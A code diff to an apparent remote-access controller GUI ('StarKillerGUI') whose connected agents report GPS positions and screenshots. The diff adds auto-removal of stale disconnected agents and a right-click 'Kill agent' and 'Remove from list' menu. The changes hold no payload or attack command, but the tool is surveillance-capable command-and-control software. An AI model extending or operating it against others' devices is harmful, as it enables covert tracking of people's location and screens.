@@ -92,6 +92,8 @@ def agent_recv(sock):
     return json.loads(body.decode("utf-8"))
 
 
+AGENT_STALE_SECS = 60  # auto-remove after this many seconds disconnected
+
 class Agent:
     def __init__(self, agent_id, sock, addr, info):
         self.id = agent_id
@@ -108,6 +110,7 @@ class Agent:
         self.connected = True
         self.connected_at = ts()
         self.last_seen = time.time()
+        self.disconnected_at = None
         self.last_gps = None
         self.last_screenshot = None
         self.last_frame_time = 0
@@ -172,6 +175,7 @@ def agent_handler(sock, addr):
                 if agent_id in agents:
                     agents[agent_id].connected = False
                     agents[agent_id].sock = None
+                    agents[agent_id].disconnected_at = time.time()
             console_write(f"[-] Agent disconnected: {agent_id}", "warn")
         try:
             sock.close()
@@ -600,7 +604,50 @@ class StarKillerGUI:
         tk.Label(ftr, text="OWN DEVICES ONLY", bg=BG2, fg=AMBER,
                  font=("Consolas", 9)).pack(side="right", padx=12)
 
+    def _remove_agent(self, agent_id):
+        with agents_lock:
+            agents.pop(agent_id, None)
+        if self.selected_agent == agent_id:
+            self.selected_agent = None
+        self._agent_list_sig = None
+        self._detail_sig = None
+        console_write(f"[*] Agent removed: {agent_id}", "warn")
+        self._refresh_agents()
+
+    def _agent_ctx_menu(self, event, agent_id):
+        menu = tk.Menu(self.root, tearoff=0, bg=BG3, fg=TEXT,
+                       activebackground=RED, activeforeground=WHITE,
+                       font=("Consolas", 9))
+        with agents_lock:
+            agent = agents.get(agent_id)
+        if agent and agent.connected:
+            menu.add_command(label="Kill agent",
+                             command=lambda: self._op_for("exit", agent_id))
+            menu.add_separator()
+        menu.add_command(label="Remove from list",
+                         command=lambda: self._remove_agent(agent_id))
+        menu.tk_popup(event.x_root, event.y_root)
+
+    def _op_for(self, op, agent_id):
+        with agents_lock:
+            agent = agents.get(agent_id)
+        if agent and agent.connected:
+            agent.send_task(op)
+
     def _refresh_agents(self):
+        now = time.time()
+        # Auto-remove stale disconnected agents
+        with agents_lock:
+            stale = [aid for aid, a in agents.items()
+                     if not a.connected and a.disconnected_at
+                     and now - a.disconnected_at > AGENT_STALE_SECS]
+        for aid in stale:
+            with agents_lock:
+                agents.pop(aid, None)
+            if self.selected_agent == aid:
+                self.selected_agent = None
+            self._agent_list_sig = None
+
         with agents_lock:
             agent_list = [(aid, a) for aid, a in agents.items()]
 
@@ -624,6 +671,7 @@ class StarKillerGUI:
                     frame = tk.Frame(self.agent_list_frame, bg=bg, cursor="hand2")
                     frame.pack(fill="x", padx=4, pady=1)
                     frame.bind("<Button-1>", lambda e, a=aid: self._select_agent(a))
+                    frame.bind("<Button-3>", lambda e, a=aid: self._agent_ctx_menu(e, a))
 
                     dot_color = GREEN if agent.connected else RED
                     dot = tk.Canvas(frame, width=10, height=10, bg=bg, highlightthickness=0)
